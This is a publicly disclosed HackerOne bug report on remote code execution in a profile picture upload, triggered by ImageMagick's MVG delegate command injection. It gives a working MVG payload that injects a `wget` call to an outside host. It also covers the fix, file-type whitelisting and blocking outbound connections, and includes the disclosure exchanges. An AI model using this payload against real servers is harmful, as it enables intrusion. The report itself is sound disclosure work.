title: RCE in profile picture upload

profile.name: HackerOne
profile.about: Vulnerability disclosure should be safe, transparent, and rewarding.

vulnerability_information:
Issue
=====
The profile picture upload at /settings/profile/edit is vulnerable to remote code execution due to the uploaded file being passed to ImageMagick without checking whether it's an actual image. Combined with the fact that ImageMagick parses ASCII text as so called MVG (Magic Vector Graphics), this enables an attacker to trigger a newly discovered vulnerability in MVG parsing which allows for command injection.

Steps to reproduce
======
Upload the following ASCII file as **x.gif** using the regular profile picture upload flow:
```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- 1.2.3.4:1337 > /dev/null`'
pop graphic-context
```
This executes the `wget` command and makes an HTTP request to 1.2.3.4 on port 1337.

Technical details
======
The "image" directive in MVG allows for the usage of so called "delegates" which are somewhat similar to a protocol specifier in a URL: a colon-seperated (delegate,argument)-pair like e.g. "label:SomeText" can be specified, invoking the respective delegate handler. Custom delegates can be added as a bash-call with substitute variables in /etc/ImageMagick/delegates.xml. The handler for https-URLs uses a bash command to invoke curl which suffers from the command injection vulnerability.

Recommendation
======
A simple fix is to check the magic values of the uploaded files and whitelist those, i.e. to only allow JPEG, GIF and PNG uploads before passing the file to ImageMagick (e.g. the `convert` utility).
Also, servers that do image processing should not be able to establish outbound network connections.
This vulnerability will be reported to ImageMagick within the next 72 hours as a detailed advisory about this and several other MVG issues is currently being drafted.
vulnerability_information_html:
Issue

The profile picture upload at /settings/profile/edit is vulnerable to remote code execution due to the uploaded file being passed to ImageMagick without checking whether it's an actual image. Combined with the fact that ImageMagick parses ASCII text as so called MVG (Magic Vector Graphics), this enables an attacker to trigger a newly discovered vulnerability in MVG parsing which allows for command injection.

Steps to reproduce

Upload the following ASCII file as x.gif using the regular profile picture upload flow:

push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- 1.2.3.4:1337 > /dev/null`'
pop graphic-context

This executes the wget command and makes an HTTP request to 1.2.3.4 on port 1337.

Technical details

The "image" directive in MVG allows for the usage of so called "delegates" which are somewhat similar to a protocol specifier in a URL: a colon-seperated (delegate,argument)-pair like e.g. "label:SomeText" can be specified, invoking the respective delegate handler. Custom delegates can be added as a bash-call with substitute variables in /etc/ImageMagick/delegates.xml. The handler for https-URLs uses a bash command to invoke curl which suffers from the command injection vulnerability.

Recommendation

A simple fix is to check the magic values of the uploaded files and whitelist those, i.e. to only allow JPEG, GIF and PNG uploads before passing the file to ImageMagick (e.g. the convert utility).
Also, servers that do image processing should not be able to establish outbound network connections.
This vulnerability will be reported to ImageMagick within the next 72 hours as a detailed advisory about this and several other MVG issues is currently being drafted.

activities.message: Thank you for your report @c666a323be94d57. We are looking into this right now.
activities.markdown_message: Thank you for your report @c666a323be94d57. We are looking into this right now.

activities.message: We confirmed the issue and are working on a fix right now.
activities.markdown_message: We confirmed the issue and are working on a fix right now.

activities.message: Hi @c666a323be94d57, thanks again for your report! We released a temporary workaround to mitigate the issue and are awaiting the final fix from ImageMagick itself. In the interim, can you make sure the issue is fixed?
activities.markdown_message: Hi @c666a323be94d57, thanks again for your report! We released a temporary workaround to mitigate the issue and are awaiting the final fix from ImageMagick itself. In the interim, can you make sure the issue is fixed?

activities.message: @c666a323be94d57, also, please keep us informed as to the current status of your disclosure to ImageMagick. Thanks again for letting us know about this!
activities.markdown_message: @c666a323be94d57, also, please keep us informed as to the current status of your disclosure to ImageMagick. Thanks again for letting us know about this!

activities.message: The issue appears fixed from my side, thanks for the immediate response! I'm going to keep you in the loop about the disclosure process.
activities.markdown_message: The issue appears fixed from my side, thanks for the immediate response! I'm going to keep you in the loop about the disclosure process.

activities.message:
Thanks again for the report, @c666a323be94d57.

After much internal debate and discussions with the other various finders of this issue, we've decided that this issue is ineligible for a bounty under HackerOne's bug bounty program, as you are not the original finder. However, we are awarding you a bonus for reporting it to us directly and allowing us to better protect our systems and keep us safe.

We've nominated the original finder, @stewie, for a bounty under the Internet Bug Bounty's @internet program, and we will continue to follow-up with that nomination to ensure he is properly rewarded for his finding.

Happy hacking!
activities.markdown_message:
Thanks again for the report, @c666a323be94d57.

After much internal debate and discussions with the other various finders of this issue, we've decided that this issue is ineligible for a bounty under HackerOne's bug bounty program, as you are not the original finder. However, we are awarding you a bonus for reporting it to us directly and allowing us to better protect our systems and keep us safe.

We've nominated the original finder, @stewie, for a bounty under the Internet Bug Bounty's @internet program, and we will continue to follow-up with that nomination to ensure he is properly rewarded for his finding.

Happy hacking!

activities.message: Thanks! Is it possible to publish this report with a restricted timeline? Also, my profile page at https://hackerone.com/c666a323be94d57 still discloses the old nickname as part of the latest status update, is this expected behaviour?
activities.markdown_message: Thanks! Is it possible to publish this report with a restricted timeline? Also, my profile page at https://hackerone.com/c666a323be94d57 still discloses the old nickname as part of the latest status update, is this expected behaviour?

activities.message:
@c666a323be94d57, considering this is our first RCE, I don't think limited timeline is appropriate. If there's something in particular you wish for us to redact, we'd be happy to do so.

https://hackerone.com/c666a323be94d57 looks fine to me. Perhaps it was just cached?

activities.message: I see, that makes sense. If you could redact my old nickname as well as this comment, that would be perfect. Also thanks for looking into that, it seems that this was just a caching issue.

activities.message: We've just updated the use of your old username in previous comments to be your current one. There's nothing sensitive in the last few comments (besides some administrivia), so just leaving them alone. If this suffices for you, please select "Disclose publicly" from the drop-down menu. Thanks!
